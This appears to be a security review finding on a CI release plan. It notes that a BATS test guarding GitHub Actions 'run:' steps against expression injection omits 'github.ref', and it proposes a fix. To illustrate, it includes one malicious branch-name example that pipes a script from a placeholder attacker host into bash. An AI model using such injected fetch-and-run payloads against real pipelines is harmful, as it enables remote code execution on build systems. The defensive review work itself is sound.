---
finding_id: R4-F01
severity: low
change_type: correctness
referenced_files: [docs/qrspi/2026-05-17-v07-release/plan.md:L660]
artifact: plan
round: 4
reviewer: security-claude
---

T19's expression-injection pin asserts only `${{ github.event.` and `${{ github.head_ref` are absent from `run:` step bodies, omitting `${{ github.ref` — which T14's description also lists as a user-controlled value that must be routed through `env:` variables.

**What the spec says today.** T14's description (plan.md ~L518) explicitly lists `github.ref` as a user-controlled context value that MUST NOT be interpolated directly into `run:` step shell commands: "all GitHub Actions context values that contain user-controlled data (`github.ref`, `github.head_ref`, `github.event.pull_request.title`, ...) MUST NOT be interpolated directly into `run:` step shell commands via `${{ expression }}` syntax." T14's test expectations do not include a BATS pin for this prohibition.

T19's test expectation (plan.md L660) carries the BATS-level enforcement: "asserts no `run:` step in the workflow body contains a direct `${{ github.event.` or `${{ github.head_ref` interpolation." The exemption for `concurrency.group` is correctly stated. However, `${{ github.ref` is absent from the pin's pattern.

**The gap.** An implementation author writing a `run:` step that includes `echo "Building ${{ github.ref }}"` (or uses `github.ref` in a shell string for a notification step) would not be caught by T19's pin. `github.ref` in `push` events is the fully-qualified ref string (e.g., `refs/heads/<branch-name>`) where `<branch-name>` is attacker-controlled — a branch named `$(curl -sSL attacker.example/payload.sh | bash)` or similar would reach the `run:` step's shell expansion. GitHub's own expression injection guidance covers `github.ref` alongside `github.head_ref` as injection-prone.

The carve-out in T14 is specifically for `concurrency.group` (a string field, not a shell command) where `${{ github.ref }}` is acceptable. The prohibition in the description covers all `run:` step bodies.

**Fix.** Extend T19's test expectation to add `${{ github.ref` to the pattern the pin checks, alongside `github.event.` and `github.head_ref`:

> `tests/unit/test-ci-workflow-shape.bats` asserts no `run:` step in the workflow body contains a direct `${{ github.event.`, `${{ github.head_ref`, or `${{ github.ref` interpolation — user-controlled GitHub Actions context values MUST be routed through `env:` block variables rather than interpolated directly into shell commands. The `concurrency.group` field is exempt because it is a string field, not a shell command.

This aligns the pin's pattern with T14's description, which already identifies `github.ref` as user-controlled.
